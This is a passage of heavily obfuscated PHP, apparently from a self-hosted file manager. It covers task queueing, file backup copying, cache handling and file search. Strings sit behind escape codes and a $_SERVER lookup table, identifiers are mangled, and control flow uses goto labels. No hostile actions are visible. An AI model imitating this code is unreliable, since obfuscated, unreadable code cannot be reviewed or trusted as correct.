size_format($ÀãÑ•Ë±[$¸‹è“ª[1719]]) . $¸‹è“ª[8] . size_format($ÀãÑ•Ë±[$¸‹è“ª[783]]); } echoLog($ŠğÒö½’ . $¸‹è“ª[53] . $Ä¥È¾, !0); } public function taskEnd($Ùìïæ–¿) { $’‡ê¦³ =& $_SERVER[¡“ËÌ§œ]; if (!$Ùìïæ–¿ || $this->taskID != $Ùìïæ–¿[$’‡ê¦³[437]]) { return; } $Ï€ïëµ = $Ùìïæ–¿ ? $Ùìïæ–¿[$’‡ê¦³[1662]] . $’‡ê¦³[8] . $Ùìïæ–¿[$’‡ê¦³[806]] . LNG($’‡ê¦³[1754]) . $’‡ê¦³[71] : $’‡ê¦³[12]; echoLog($’‡ê¦³[1756] . $Ùìïæ–¿[$’‡ê¦³[1559]] . ($Ùìïæ–¿[$’‡ê¦³[491]] ? $’‡ê¦³[71] . $Ùìïæ–¿[$’‡ê¦³[491]] : $’‡ê¦³[12]) . $’‡ê¦³[71] . $Ï€ïëµ . $’‡ê¦³[1757] . sprintf($’‡ê¦³[870], timeFloat() - $Ùìïæ–¿[$’‡ê¦³[1665]]) . $’‡ê¦³[1677]); $this->end(); } public function taskKill($Ñ®ˆ¯ªÄ) { $ğ‹á şù =& $_SERVER[¡“ËÌ§œ]; if (!$Ñ®ˆ¯ªÄ || $this->taskID != $Ñ®ˆ¯ªÄ[$ğ‹á şù[437]]) { return; } echoLog($ğ‹á şù[1758] . $Ñ®ˆ¯ªÄ[$ğ‹á şù[1559]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\153\x51\165\x65\x75\x65\x4c\x65\x6e\x67\164\x68"; const QUEUE_DATA = "\x74\141\163\153\x51\165\x65\165\145\x44\141\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($”¹ÂøÆ–, $óå¸§³™ = array(), $§ÊÒÜì = '', $±¸ì÷Àí = '') { $áêÇöû° =& $_SERVER[¡“ËÌ§œ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($±¸ì÷Àí && array_find_by_field(self::$listData, $áêÇöû°[94], $±¸ì÷Àí)) { return !0; } self::$listData[] = array($áêÇöû°[293] => $”¹ÂøÆ–, $áêÇöû°[1759] => $óå¸§³™, $áêÇöû°[491] => $§ÊÒÜì, $áêÇöû°[94] => $±¸ì÷Àí); return !0; } public static function addSubmit() { $†ñÂ¬˜â =& $_SERVER[¡“ËÌ§œ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($†ñÂ¬˜â[1760] . json_encode_force(array_to_keyvalue(self::$listData, $†ñÂ¬˜â[12], $†ñÂ¬˜â[491])), $†ñÂ¬˜â[1761]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ÏèÇ«¯›, $µ•Ú÷¿ = array(), $ğîâ®ú = '', $òöóı„§ = '') { $†ì…ò© =& $_SERVER[¡“ËÌ§œ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $£İŒ´ú = self::getAll(); if ($òöóı„§ && array_find_by_field($£İŒ´ú, $†ì…ò©[94], $òöóı„§)) { return !0; } $£İŒ´ú[] = array($†ì…ò©[293] => $ÏèÇ«¯›, $†ì…ò©[1759] => $µ•Ú÷¿, $†ì…ò©[491] => $ğîâ®ú, $†ì…ò©[94] => $òöóı„§); write_log($†ì…ò©[1760] . $ğîâ®ú, $†ì…ò©[1761]); self::setAll($£İŒ´ú); return !0; } public static function run() { $“´®–øä =& $_SERVER[¡“ËÌ§œ]; $• ”×ƒ¶ = self::getAll(); $½»˜¶İ = array_shift($• ”×ƒ¶); if (!$½»˜¶İ) { return !1; } self::setAll($• ”×ƒ¶); $½òûº = timeFloat(); $ÑÜ¯ì±— = $“´®–øä[12]; try { $ÑÜ¯ì±— = Hook::apply($½»˜¶İ[$“´®–øä[293]], $½»˜¶İ[$“´®–øä[1759]]); } catch (Exception $œä”«ŸÓ) { } $¼¿—ø’ú = number_format(timeFloat() - $½òûº, 3) . $“´®–øä[1677]; if ($ÑÜ¯ì±— && is_string($ÑÜ¯ì±—)) { $¼¿—ø’ú = $¼¿—ø’ú . $“´®–øä[1762] . $ÑÜ¯ì±—; } write_log($“´®–øä[1763] . $½»˜¶İ[$“´®–øä[491]] . $“´®–øä[1764] . $¼¿—ø’ú, $“´®–øä[1761]); return !0; } public static function count() { $å²ô•¼ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$å²ô•¼) { return 0; } return intval($å²ô•¼); } public static function getAll() { $‚ªïåé = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$‚ªïåé) { return array(); } return $‚ªïåé; } public static function setAll($ô¾Êâ–) { $÷Ş¦Å—¿ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ô¾Êâ–), $÷Ş¦Å—¿); Cache::set(self::QUEUE_DATA, $ô¾Êâ–, $÷Ş¦Å—¿); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto dÓó‹ÒÈòŒ; F¡ƒò‚’‰–: class BackupFile { public function __construct() { } public function index() { $İ¨øšı = Backup::get(); $İ»‡£àÆ = $İ¨øšı[$_SERVER[¡“ËÌ§œ][322]][$_SERVER[¡“ËÌ§œ][200]][$_SERVER[¡“ËÌ§œ][506]]; $Õ¹ŠûÆ = array($_SERVER[¡“ËÌ§œ][507] => array($_SERVER[¡“ËÌ§œ][827], $İ»‡£àÆ), $_SERVER[¡“ËÌ§œ][828] => array($_SERVER[¡“ËÌ§œ][360], $İ¨øšı[$_SERVER[¡“ËÌ§œ][771]])); $²ıË¸ªÄ = (int) Model($_SERVER[¡“ËÌ§œ][809])->where($Õ¹ŠûÆ)->count($_SERVER[¡“ËÌ§œ][506]); $ŞŞÃÏ«Â = (int) Model($_SERVER[¡“ËÌ§œ][809])->where($Õ¹ŠûÆ)->sum($_SERVER[¡“ËÌ§œ][76]); $Â»¿äÔÀ = new TaskFileTransfer($_SERVER[¡“ËÌ§œ][829], $_SERVER[¡“ËÌ§œ][800], $²ıË¸ªÄ, LNG($_SERVER[¡“ËÌ§œ][801]) . $_SERVER[¡“ËÌ§œ][802] . LNG($_SERVER[¡“ËÌ§œ][830])); $Â»¿äÔÀ->task[$_SERVER[¡“ËÌ§œ][783]] = $ŞŞÃÏ«Â; $æâçÕ = array($_SERVER[¡“ËÌ§œ][831] => $²ıË¸ªÄ, $_SERVER[¡“ËÌ§œ][832] => $ŞŞÃÏ«Â, $_SERVER[¡“ËÌ§œ][833] => time()); Backup::set($æâçÕ); $ÊÍÌÆÈ = !0; $¶øªØæô = $this->storeIds(); $ÅÊë¿ñ = 1; $éÈğ¤Â² = 1000; $€ç«–ø = $¢ÆŸåé = 0; $ä•¬µ£ = array(); $ÇçÁ¯ = $½¹ÅÈû” = 0; do { $Ùß”½ = $_SERVER[¡“ËÌ§œ][834]; $Û½·¯€ä = Model($_SERVER[¡“ËÌ§œ][809])->where($Õ¹ŠûÆ)->field($Ùß”½)->order($_SERVER[¡“ËÌ§œ][835])->selectPage($éÈğ¤Â², $ÅÊë¿ñ); $ƒÍÏ­Éö = !empty($Û½·¯€ä[$_SERVER[¡“ËÌ§œ][398]]) ? $Û½·¯€ä[$_SERVER[¡“ËÌ§œ][398]] : array(); foreach ($ƒÍÏ­Éö as $¾—Œ£Î‰) { if (!$this->_fileExist($¾—Œ£Î‰, $ä•¬µ£, $¶øªØæô)) { $²ıË¸ªÄ -= 1; $ŞŞÃÏ«Â -= (int) $¾—Œ£Î‰[$_SERVER[¡“ËÌ§œ][76]]; write_log("\146\x69\154\x65\x20\156\x6f\164\x20\145\x78\151\x73\164\x2e\x66\x69\154\145\111\104\72{$¾—Œ£Î‰[$_SERVER[¡“ËÌ§œ][506]]}\x2c\40\160\141\x74\x68\x3a{$¾—Œ£Î‰[$_SERVER[¡“ËÌ§œ][84]]}", $_SERVER[¡“ËÌ§œ][836]); continue; } $Ä½ÀèÓŒ = $¾—Œ£Î‰[$_SERVER[¡“ËÌ§œ][84]]; $“ã‡õ¬à = "\x7b\x69\x6f\72{$İ¨øšı[$_SERVER[¡“ËÌ§œ][771]]}\x7d" . substr($Ä½ÀèÓŒ, strlen("\x7b\151\157\72{$¾—Œ£Î‰[$_SERVER[¡“ËÌ§œ][837]]}\175")); if (IO::exist($“ã‡õ¬à)) { $Â»¿äÔÀ->updateFileEnd($¾—Œ£Î‰[$_SERVER[¡“ËÌ§œ][32]], $¾—Œ£Î‰[$_SERVER[¡“ËÌ§œ][76]]); } else { $“ã‡õ¬à = get_path_father($“ã‡õ¬à); IO::mkdir($“ã‡õ¬à); if (!IO::copy($Ä½ÀèÓŒ, $“ã‡õ¬à, $_SERVER[¡“ËÌ§œ][838])) { write_log($_SERVER[¡“ËÌ§œ][839] . $Ä½ÀèÓŒ . $_SERVER[¡“ËÌ§œ][823] . $“ã‡õ¬à . $_SERVER[¡“ËÌ§œ][164], $_SERVER[¡“ËÌ§œ][800]); $ÊÍÌÆÈ = !1; break; } } $İ»‡£àÆ = $¾—Œ£Î‰[$_SERVER[¡“ËÌ§œ][506]]; $¢ÆŸåé += 1; $€ç«–ø += $¾—Œ£Î‰[$_SERVER[¡“ËÌ§œ][76]]; $½¹ÅÈû” += 1; $ÇçÁ¯ += $¾—Œ£Î‰[$_SERVER[¡“ËÌ§œ][76]]; if ($€ç«–ø >= 1024 * 1024 * 100) { $æâçÕ = array($_SERVER[¡“ËÌ§œ][840] => $İ»‡£àÆ, $_SERVER[¡“ËÌ§œ][841] => $½¹ÅÈû”, $_SERVER[¡“ËÌ§œ][842] => $ÇçÁ¯); Backup::set($æâçÕ); $€ç«–ø = $¢ÆŸåé = 0; } } $æ‚ôµäå = count($ƒÍÏ­Éö); $ÅÊë¿ñ++; } while ($æ‚ôµäå == $éÈğ¤Â²); $Â»¿äÔÀ->end(); $æâçÕ = array($_SERVER[¡“ËÌ§œ][843] => 1, $_SERVER[¡“ËÌ§œ][781] => time(), $_SERVER[¡“ËÌ§œ][795] => 1, $_SERVER[¡“ËÌ§œ][840] => $İ»‡£àÆ, $_SERVER[¡“ËÌ§œ][832] => $ŞŞÃÏ«Â, $_SERVER[¡“ËÌ§œ][831] => $²ıË¸ªÄ, $_SERVER[¡“ËÌ§œ][844] => time()); if ($¢ÆŸåé) { $æâçÕ[$_SERVER[¡“ËÌ§œ][841]] = $½¹ÅÈû”; $æâçÕ[$_SERVER[¡“ËÌ§œ][842]] = $ÇçÁ¯; } Backup::set($æâçÕ); $this->_fileFilter($ä•¬µ£); return !0; } private function _fileExist($“é˜ÅÉÀ, &$Ñ˜«ñİØ, $ÉœãòÆš) { $›¾ÊÊÖõ =& $_SERVER[¡“ËÌ§œ]; $¢àõıüõ = $“é˜ÅÉÀ[$›¾ÊÊÖõ[84]]; if (in_array($“é˜ÅÉÀ[$›¾ÊÊÖõ[506]], $Ñ˜«ñİØ)) { return !1; } if (!in_array($“é˜ÅÉÀ[$›¾ÊÊÖõ[837]], $ÉœãòÆš)) { return !1; } if (IO::exist($¢àõıüõ)) { return !0; } $İğÍ‘ÌÑ = get_path_father($¢àõıüõ); if (IO::exist($İğÍ‘ÌÑ)) { $Ñ˜«ñİØ[] = $“é˜ÅÉÀ[$›¾ÊÊÖõ[506]]; return !1; } $Ê²ñ´öÃ = array($›¾ÊÊÖõ[837] => $“é˜ÅÉÀ[$›¾ÊÊÖõ[837]], $›¾ÊÊÖõ[84] => array($›¾ÊÊÖõ[412], "{$İğÍ‘ÌÑ}\x25")); $ãª‹ì´¾ = Model($›¾ÊÊÖõ[809])->where($Ê²ñ´öÃ)->field($›¾ÊÊÖõ[507])->select(); $Ñ˜«ñİØ = array_merge($Ñ˜«ñİØ, array_to_keyvalue($ãª‹ì´¾, $›¾ÊÊÖõ[12], $›¾ÊÊÖõ[506])); return !1; } private function _fileFilter($…™Ëîí) { $²‚ÇÜ¢à =& $_SERVER[¡“ËÌ§œ]; if (empty($…™Ëîí)) { return; } $Ò¶³ö™“ = array($²‚ÇÜ¢à[506] => array($²‚ÇÜ¢à[7], array_unique($…™Ëîí))); $ÈÕ÷èÊ• = Model($²‚ÇÜ¢à[845])->where($Ò¶³ö™“)->field($²‚ÇÜ¢à[440])->select(); foreach ($ÈÕ÷èÊ• as $‘ùêÛ÷Ä) { Model($²‚ÇÜ¢à[845])->remove($‘ùêÛ÷Ä[$²‚ÇÜ¢à[440]], !1); } } private function storeIds() { $àÊñÁÁ§ =& $_SERVER[¡“ËÌ§œ]; $ŸªÍ”¾Ÿ = Model($àÊñÁÁ§[787])->listData(); $öÍ­ùæ• = array(); $Ø‹‚»® = $GLOBALS[$àÊñÁÁ§[6]][$àÊñÁÁ§[89]][$àÊñÁÁ§[846]]; foreach ($ŸªÍ”¾Ÿ as $ˆèä”áš) { $¡†üìß = strtolower($ˆèä”áš[$àÊñÁÁ§[95]]); if (!isset($Ø‹‚»®[$¡†üìß])) { continue; } $úé³«Ÿ = $àÊñÁÁ§[74] . (isset($Ø‹‚»®[$¡†üìß]) ? $Ø‹‚»®[$¡†üìß] : ucfirst($¡†üìß)); if (!class_exists($úé³«Ÿ)) { continue; } $öÍ­ùæ•[] = $ˆèä”áš[$àÊñÁÁ§[437]]; } return $öÍ­ùæ•; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Şöèİ©‘ =& $_SERVER[¡“ËÌ§œ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Õ˜î ˜µ = $GLOBALS[$Şöèİ©‘[6]][$Şöèİ©‘[378]]; $òûºòØÁ = $Õ˜î ˜µ[$Õ˜î ˜µ[$Şöèİ©‘[847]]]; $ø’ç¥¸ = $Õ˜î ˜µ[$Şöèİ©‘[848]]; switch ($Õ˜î ˜µ[$Şöèİ©‘[847]]) { case $Şöèİ©‘[21]: self::$handle = Model($Şöèİ©‘[849]); break; case $Şöèİ©‘[850]: self::$handle = new CacheRedis($òûºòØÁ, $ø’ç¥¸); break; case $Şöèİ©‘[851]: self::$handle = new CacheMemcached($òûºòØÁ, $ø’ç¥¸); break; case $Şöèİ©‘[200]: self::$handle = new CacheFile($òûºòØÁ, $ø’ç¥¸); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ŸºŠË´å) { if (is_array($ŸºŠË´å) || is_object($ŸºŠË´å)) { $ŸºŠË´å = json_encode($ŸºŠË´å); } $ŸºŠË´å = rawurlencode($ŸºŠË´å); return md5(KOD_SITE_ID . $_SERVER[¡“ËÌ§œ][11] . $ŸºŠË´å); } public static function get($ŸÚ©ì…, $Î´öíç = false) { $Ü¤‘îÄ” = self::key($ŸÚ©ì…); if ($Î´öíç) { return unserialize(self::init()->get($Ü¤‘îÄ”)); } if (!isset(self::$memoryCache[$Ü¤‘îÄ”])) { $•¸Ñ÷•¦ = self::init()->get($Ü¤‘îÄ”); self::$memoryCache[$Ü¤‘îÄ”] = unserialize($•¸Ñ÷•¦); } return self::$memoryCache[$Ü¤‘îÄ”]; } public static function set($Î­ éÇª, $›­’ôÉ, $ÔœîÁ–´ = false) { $ş†ôáÌ = self::key($Î­ éÇª); if (isset(self::$memoryCache[$ş†ôáÌ]) && self::$memoryCache[$ş†ôáÌ] === $›­’ôÉ) { return !0; } if ($ÔœîÁ–´ === 0) { self::$memoryCache[$ş†ôáÌ] = $›­’ôÉ; return !0; } CacheLock::lock($Î­ éÇª); $šÀùˆÎª = self::init()->set($ş†ôáÌ, serialize($›­’ôÉ), $ÔœîÁ–´); self::$memoryCache[$ş†ôáÌ] = $›­’ôÉ; CacheLock::unlock($Î­ éÇª); return $šÀùˆÎª; } public static function getCall($ÃùÜÖ‰, $ÔÂÒ«À°, $Ãº·³Û, $ç˜…äÓ = array()) { $‡ªº£È§ =& $_SERVER[¡“ËÌ§œ]; $°Ôş¤ñÔ = self::get($ÃùÜÖ‰); if ($°Ôş¤ñÔ || $°Ôş¤ñÔ === $‡ªº£È§[12]) { return $°Ôş¤ñÔ; } $°Ôş¤ñÔ = call_user_func_array($Ãº·³Û, $ç˜…äÓ); $°Ôş¤ñÔ = $°Ôş¤ñÔ ? $°Ôş¤ñÔ : $‡ªº£È§[12]; self::set($ÃùÜÖ‰, $°Ôş¤ñÔ, $ÔÂÒ«À°); return $°Ôş¤ñÔ; } public static function remove($ìâ¬ÃÊ„) { $”‚ëÖÁÂ = self::key($ìâ¬ÃÊ„); unset(self::$memoryCache[$”‚ëÖÁÂ]); self::clearTimeout(); CacheLock::lock($ìâ¬ÃÊ„); $«ÛÜ‰» = self::init()->remove($”‚ëÖÁÂ); CacheLock::unlock($ìâ¬ÃÊ„); return $«ÛÜ‰»; } public static function removeMemory($Íì£–©š) { $ì¯ªÄ = self::key($Íì£–©š); unset(self::$memoryCache[$ì¯ªÄ]); } public static function clearMemory($üñŒòîÄ = false) { if ($üñŒòîÄ) { $üñŒòîÄ = self::key($üñŒòîÄ); unset(self::$memoryCache[$üñŒòîÄ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¡“ËÌ§œ][852])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¡“ËÌ§œ][853])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ëâæµˆá, $âÑ»Ã®) { $àÄîº¿ =& $_SERVER[¡“ËÌ§œ]; $this->cachePath = $Ëâæµˆá[$àÄîº¿[84]]; $this->prefix = $àÄîº¿[854]; $this->cacheTime = $âÑ»Ã®; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Û°¿üİ…) { $ôà»€´Ü =& $_SERVER[¡“ËÌ§œ]; $Û°¿üİ… = str_replace(array($ôà»€´Ü[855], $ôà»€´Ü[97], $ôà»€´Ü[73]), $ôà»€´Ü[856], $Û°¿üİ…); return $this->cachePath . $ôà»€´Ü[857] . $Û°¿üİ… . $ôà»€´Ü[858]; } public function set($‘ÍØıÑ¦, $ç¬Ô³ê, $ğ¡¶•¬• = false) { $ğ¡¶•¬• = $ğ¡¶•¬• ? $ğ¡¶•¬• : $this->cacheTime; $¤ÉŒ²– = $this->getFile($‘ÍØıÑ¦); if (file_put_contents($¤ÉŒ²–, $this->prefix . $ç¬Ô³ê, LOCK_EX)) { @touch($¤ÉŒ²–, intval(time() + $ğ¡¶•¬•)); clearstatcache(); return !0; } @unlink($¤ÉŒ²–); return !1; } public function get($£çŞü‘›) { $œ¥åÑ‘é = $this->getFile($£çŞü‘›); if (file_exists($œ¥åÑ‘é) && filemtime($œ¥åÑ‘é) < time()) { @unlink($œ¥åÑ‘é); return !1; } $Ã…Úš¼ = @file_get_contents($œ¥åÑ‘é); return substr($Ã…Úš¼, strlen($this->prefix)); } public function remove($ØàÚ††Ÿ) { $—Ùì¾˜ß = $this->getFile($ØàÚ††Ÿ); return @unlink($—Ùì¾˜ß); } public function deleteAll() { $²ÆŸşÄ… =& $_SERVER[¡“ËÌ§œ]; $•ÔıˆÓ = scandir($this->cachePath); foreach ($•ÔıˆÓ as $¹û³ûÚ) { $Ú­“Öà = $this->cachePath . $¹û³ûÚ; if (strpos($Ú­“Öà, $²ÆŸşÄ…[858]) && strpos($Ú­“Öà, $²ÆŸşÄ…[859])) { @unlink($Ú­“Öà); } } } public function clearTimeout() { $ª‹œÚÕÄ =& $_SERVER[¡“ËÌ§œ]; $Ï½’Ø†í = scandir($this->cachePath); foreach ($Ï½’Ø†í as $×¨ó…¥) { $ØÑëÔÍš = $this->cachePath . $×¨ó…¥; if (strpos($ØÑëÔÍš, $ª‹œÚÕÄ[858]) && strpos($ØÑëÔÍš, $ª‹œÚÕÄ[859]) && filemtime($ØÑëÔÍš) < time()) { @unlink($ØÑëÔÍš); } } } } goto c¶‚œÜÒ±; B¯ÉåíÏĞÁ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($°Éüœ) { $Ü§èœíú =& $_SERVER[¡“ËÌ§œ]; $˜úªÂôË = KodIO::fileTypeList(); $¸ãïØ¶× = $˜úªÂôË[$°Éüœ]; if (!$¸ãïØ¶×) { return array(); } $“à‚Äƒì = $¸ãïØ¶×[$Ü§èœíú[174]]; $ô‘óôé = $Ü§èœíú[7]; if (!$¸ãïØ¶×[$Ü§èœíú[174]]) { $Ğìá¼ºÈ = array_to_keyvalue($˜úªÂôË, $Ü§èœíú[12], $Ü§èœíú[174]); $“à‚Äƒì = implode($Ü§èœíú[50], $Ğìá¼ºÈ); $ô‘óôé = $Ü§èœíú[2107]; } $Å’™õ¨¤ = explode($Ü§èœíú[50], trim($“à‚Äƒì, $Ü§èœíú[50])); return array($ô‘óôé, $Å’™õ¨¤); } public function listPathType($„€İó³æ) { $ÔÎùÚî· =& $_SERVER[¡“ËÌ§œ]; $•ú¤¯Íº = $this->fileTypeWhere($„€İó³æ); if (!$•ú¤¯Íº) { return array(); } $ºä¤¤·ß = USER_ID; $úı®½¡Œ = Model($ÔÎùÚî·[563])->getInfo($ºä¤¤·ß); $ŞÆÆïÏ£ = array($ÔÎùÚî·[614] => SourceModel::TYPE_USER, $ÔÎùÚî·[549] => array($ÔÎùÚî·[578], $ÔÎùÚî·[559] . $úı®½¡Œ[$ÔÎùÚî·[87]][$ÔÎùÚî·[440]] . $ÔÎùÚî·[579]), $ÔÎùÚî·[615] => $ºä¤¤·ß, $ÔÎùÚî·[612] => 0, $ÔÎùÚî·[613] => $•ú¤¯Íº); return $this->listSource($ŞÆÆïÏ£); } public function listSearch($šàÀã·Ó, $Æ’­Èã = 300) { $³æ¨ÉÖ´ =& $_SERVER[¡“ËÌ§œ]; if (isset($šàÀã·Ó[$³æ¨ÉÖ´[1945]]) && $šàÀã·Ó[$³æ¨ÉÖ´[1945]]) { $šàÀã·Ó[$³æ¨ÉÖ´[1945]] = str_replace($³æ¨ÉÖ´[413], $³æ¨ÉÖ´[2108], trim($šàÀã·Ó[$³æ¨ÉÖ´[1945]])); } $©ñ‡­ˆÆ = $this->_parseSearchWhere($šàÀã·Ó); if (!isset($©ñ‡­ˆÆ[$³æ¨ÉÖ´[469]])) { $©ñ‡­ˆÆ[$³æ¨ÉÖ´[469]] = 0; } $¢ú‚ö€‰ = $³æ¨ÉÖ´[2109]; $ÔÇ‡¿ŞÌ = $©ñ‡­ˆÆ; $ïï“£ö™ = $¢ú‚ö€‰; $this->_listSearchBindPinyin($šàÀã·Ó, $©ñ‡­ˆÆ, $¢ú‚ö€‰); $this->alias($³æ¨ÉÖ´[484])->_makeOrder(); $©ñ‡­ˆÆ = $this->parseWhereLike($©ñ‡­ˆÆ); $Îó¡Ôˆ± = $this->distinct(!0)->field($¢ú‚ö€‰)->where($©ñ‡­ˆÆ)->selectPage($Æ’­Èã); if ($GLOBALS[$³æ¨ÉÖ´[6]][$³æ¨ÉÖ´[410]][$³æ¨ÉÖ´[411]] && Input::check($šàÀã·Ó[$³æ¨ÉÖ´[1945]], $³æ¨ÉÖ´[621]) && $Îó¡Ôˆ±[$³æ¨ÉÖ´[395]][$³æ¨ÉÖ´[382]] == 1 && $Îó¡Ôˆ±[$³æ¨ÉÖ´[395]][$³æ¨ÉÖ´[396]] == 0) { $Îó¡Ôˆ± = $this->distinct(!0)->field($¢ú‚ö€‰)->where($ÔÇ‡¿ŞÌ)->limit(1000)->select(); $Îó¡Ôˆ± = array_page_split($Îó¡Ôˆ±, !1, $Æ’­Èã); } $this->_listSearchFileContent($Îó¡Ôˆ±, $šàÀã·Ó, $ïï“£ö™, $ÔÇ‡¿ŞÌ); $this->_listSearchDesc($Îó¡Ôˆ±, $šàÀã·Ó, $ïï“£ö™); $this->_listSearchTag($Îó¡Ôˆ±, $šàÀã·Ó, $ïï“£ö™); $this->_listSearchGroupTag($Îó¡Ôˆ±, $šàÀã·Ó, $ïï“£ö™); $this->_listDataApply($Îó¡Ôˆ±[$³æ¨ÉÖ´[398]]); $this->_listMake($Îó¡Ôˆ±); return $Îó¡Ôˆ±; } private function _listSearchFileContent(&$Ûí…çë—, $ïëöƒû, $˜ş¬êş, $§‡‰‰Û¶) { $şïà°À =& $_SERVER[¡“ËÌ§œ]; if (!$ïëöƒû[$şïà°À[1945]] || $Ûí…çë—[$şïà°À[395]][$şïà°À[382]] > 1) { return; } if (!isset($§‡‰‰Û¶[$şïà°À[32]]) || !is_array($ïëöƒû[$şïà°À[506]])) { return; } $§‡‰‰Û¶[$şïà°À[506]] = array($şïà°À[7], $ïëöƒû[$şïà°À[506]]); unset($§‡‰‰Û¶[$şïà°À[32]]); unset($ïëöƒû[$şïà°À[506]]); $ŒÄ‹¸‡ë = $this->field($˜ş¬êş)->where($§‡‰‰Û¶)->limit($şïà°À[2110])->select(); if (!$ŒÄ‹¸‡ë || count($ŒÄ‹¸‡ë) == 0) { return; } $Ûí…çë—[$şïà°À[398]] = array_merge($ŒÄ‹¸‡ë, $Ûí…çë—[$şïà°À[398]]); $Ûí…çë—[$şïà°À[395]][$şïà°À[396]] += count($ŒÄ‹¸‡ë); } private function _listSearchTag(&$…­ÛÊİİ, $ÉÀ‚®ßù, $í­ãÓß) { $²üÍ¤¡ =& $_SERVER[¡“ËÌ§œ]; if (!$ÉÀ‚®ßù[$²üÍ¤¡[1945]] || $…­ÛÊİİ[$²üÍ¤¡[395]][$²üÍ¤¡[382]] > 1) { return; } $”…ìª¡ = Model($²üÍ¤¡[2111])->listData(); $ã«§¦¦­ = array(); $¥Ğî‘³˜ = $ÉÀ‚®ßù[$²üÍ¤¡[1945]]; foreach ($”…ìª¡ as $ÒŒ˜¤î) { $ˆµ¦ø° = $ÒŒ˜¤î[$²üÍ¤¡[32]]; $í½•»ı„ = str_replace($²üÍ¤¡[53], $²üÍ¤¡[12], Pinyin::get($ˆµ¦ø°)); if (stripos($ˆµ¦ø°, $¥Ğî‘³˜) !== !1 || stripos($í½•»ı„, $¥Ğî‘³˜) !== !1) { $ã«§¦¦­[] = $ÒŒ˜¤î[$²üÍ¤¡[437]]; } } if (!$ã«§¦¦­) { return; } $Ù„ÊòäÔ = array($²üÍ¤¡[464] => array($²üÍ¤¡[7], $ã«§¦¦­), $²üÍ¤¡[1661] => USER_ID); $™ÂÁ›×Ø = Model($²üÍ¤¡[466])->field($²üÍ¤¡[84])->where($Ù„ÊòäÔ)->select(); $™ÂÁ›×Ø = array_to_keyvalue($™ÂÁ›×Ø, $²üÍ¤¡[12], $²üÍ¤¡[84]); $¶„ÓÆ‰Õ = array_unique($™ÂÁ›×Ø); $this->_listSearchMerge($…­ÛÊİİ, $ÉÀ‚®ßù, $í­ãÓß, $¶„ÓÆ‰Õ); } private function _listSearchDesc(&$ÉÒÎëÑ°, $Ú›ıç, $£•ú¯é) { $¿ÍÔâ³ƒ =& $_SERVER[¡“ËÌ§œ]; if (!$Ú›ıç[$¿ÍÔâ³ƒ[1945]] || $ÉÒÎëÑ°[$¿ÍÔâ³ƒ[395]][$¿ÍÔâ³ƒ[382]] > 1) { return; } $Öõğõ¤ô = array($¿ÍÔâ³ƒ[94] => $¿ÍÔâ³ƒ[491], $¿ÍÔâ³ƒ[403] => array($¿ÍÔâ³ƒ[412], $¿ÍÔâ³ƒ[1947] . $Ú›ıç[$¿ÍÔâ³ƒ[1945]] . $¿ÍÔâ³ƒ[1947])); $ô¦‹Í‹ô = !1; if ($ô¦‹Í‹ô) { $„ ¬ì Â = $this->listSearchChildren($Ú›ıç[$¿ÍÔâ³ƒ[470]]); $„ ¬ì Â = array_unique($„ ¬ì Â); if (!$„ ¬ì Â) { return; } $Öõğõ¤ô[$¿ÍÔâ³ƒ[440]] = array($¿ÍÔâ³ƒ[7], $„ ¬ì Â); } $Ş‡İ•£ = Model($¿ÍÔâ³ƒ[598])->field($¿ÍÔâ³ƒ[440])->where($Öõğõ¤ô)->limit(5000)->select(); $¸ûËÜÔ  = array_to_keyvalue($Ş‡İ•£, $¿ÍÔâ³ƒ[12], $¿ÍÔâ³ƒ[440]); $this->_listSearchMerge($ÉÒÎëÑ°, $Ú›ıç, $£•ú¯é, $¸ûËÜÔ ); } private function _listSearchGroupTag(&$Œßïˆüš, $Ü¦ŠÉ€İ, $¨û³Åå) { $„…çò¬ =& $_SERVER[¡“ËÌ§œ]; if (!$Ü¦ŠÉ€İ[$„…çò¬[1945]] || $Œßïˆüš[$„…çò¬[395]][$„…çò¬[382]] > 1 || !$Ü¦ŠÉ€İ[$„…çò¬[470]]) { return; } $Ë°§òîè = $this->sourceInfo($Ü¦ŠÉ€İ[$„…çò¬[470]]); if (!$Ë°§òîè || $Ë°§òîè[$„…çò¬[449]] != SourceModel::TYPE_GROUP) { return; } $­ÂŞëè§ = $Ë°§òîè[$„…çò¬[534]]; $²ÉŒñÉĞ = Model($„…çò¬[2112])->get($­ÂŞëè§); $·¶Ïâğ = array(); $ˆû¨®¬“ = $Ü¦ŠÉ€İ[$„…çò¬[1945]]; foreach ($²ÉŒñÉĞ[$„…çò¬[398]] as $ç«¨Ò¼œ) { $÷¢Üä¬² = $ç«¨Ò¼œ[$„…çò¬[32]]; $¿ó…•¥ö = str_replace($„…çò¬[53], $„…çò¬[12], Pinyin::get($÷¢Üä¬²)); if (stripos($÷¢Üä¬², $ˆû¨®¬“) !== !1 || stripos($¿ó…•¥ö, $ˆû¨®¬“) !== !1) { $·¶Ïâğ[] = $ç«¨Ò¼œ[$„…çò¬[437]]; } } if (!$·¶Ïâğ) { return; } $‡Ù¬µ× = array($„…çò¬[464] => array($„…çò¬[7], $·¶Ïâğ), 